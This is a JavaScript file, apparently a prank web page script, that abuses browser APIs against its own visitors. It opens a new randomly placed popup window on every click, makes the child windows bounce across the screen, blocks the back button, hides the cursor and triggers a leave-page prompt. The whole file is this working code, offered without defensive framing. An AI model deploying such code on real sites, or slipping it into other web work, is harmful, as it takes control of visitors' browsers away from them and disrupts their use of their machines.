const SCREEN_WIDTH = window.screen.availWidth
const SCREEN_HEIGHT = window.screen.availHeight
const WIN_WIDTH = 480
const WIN_HEIGHT = 260
const VELOCITY = 4
const MARGIN = 10
const TICK_LENGTH = 20
const wins = []
const isChildWindow = (window.opener && isParentSameOrigin()) ||
    window.location.search.indexOf('child=true') !== -1

/**
 * Is this window a parent window?
 */
const isParentWindow = !isChildWindow
confirmPageUnload()
blockBackButton()
hideCursor()
document.addEventListener('click', () => {
    openWindow()
})
focusWindows()
if (isChildWindow) initChildWindow()

function initChildWindow() {
    moveWindowBounce()
}

function focusWindows() {
    wins.forEach(win => {
        if (!win.closed) win.focus()
    })
}

function openWindow() {
    const { x, y } = getRandomCoords()
    const opts = `width=${WIN_WIDTH},height=${WIN_HEIGHT},left=${x},top=${y}`
    const win = window.open(window.location.pathname, '', opts)
    // New windows may be blocked by the popup blocker 
    if (!win) return
    wins.push(win)
}


function getRandomCoords() {
    const x = MARGIN +
        Math.floor(Math.random() * (SCREEN_WIDTH - WIN_WIDTH - MARGIN))
    const y = MARGIN +
        Math.floor(Math.random() * (SCREEN_HEIGHT - WIN_HEIGHT - MARGIN))
    return { x, y }
}

function moveWindowBounce() {
    let vx = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
    let vy = VELOCITY * (Math.random() > 0.5 ? 1 : -1)
    window.setInterval(() => {
        const x = window.screenX
        const y = window.screenY
        const width = window.outerWidth
        const height = window.outerHeight
        if (x < MARGIN) vx = Math.abs(vx)
        if (x + width > SCREEN_WIDTH - MARGIN)
            vx = -1 * Math.abs(vx)
        if (y < MARGIN + 20) vy = Math.abs(vy)
        if (y + height > SCREEN_HEIGHT - MARGIN)
            vy = -1 * Math.abs(vy)
        window.moveBy(vx, vy)
    }, TICK_LENGTH)
}

function isParentSameOrigin() {
    try {
        // May throw an exception if `window.opener` is on another origin
        return window.opener.location.origin === window.location.origin
    } catch (err) {
        return false
    }
}
function blockBackButton() {
    window.addEventListener('popstate', () => {
        window.history.forward()
    })
}
function hideCursor() {
    document.querySelector('html').style = 'cursor: none;'
}
function confirmPageUnload() {
    window.addEventListener('beforeunload', event => {
        event.returnValue = true
    })
}